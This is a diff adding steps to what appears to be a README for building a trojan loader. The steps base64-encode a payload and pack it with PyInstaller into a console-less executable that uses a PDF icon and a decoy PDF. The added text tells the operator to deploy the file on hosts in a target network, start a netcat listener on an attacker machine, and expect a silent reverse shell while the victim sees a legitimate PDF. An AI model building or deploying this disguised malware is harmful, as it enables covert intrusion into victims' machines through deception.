@@ -54,3 +54,21 @@ base64 payload.py > payload.b64
 ### 3. Build the Executable with PyInstaller
 
 pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "payload.b64;." --add-data "test.pdf;." loader.py
+
+A new standalone executable will be created in the dist/ directory:
+
+dist/loader.exe
+
+✅ This file can now be deployed to any host within the target network.
+
+🧪 To test it:
+Start a listener on your attacker machine:
+
+  nc -lvnp 4444
+
+Run loader.exe on the target machine.
+
+If successful:
+
+The victim sees a legitimate PDF (test.pdf)
+A reverse shell is silently established back to your listener
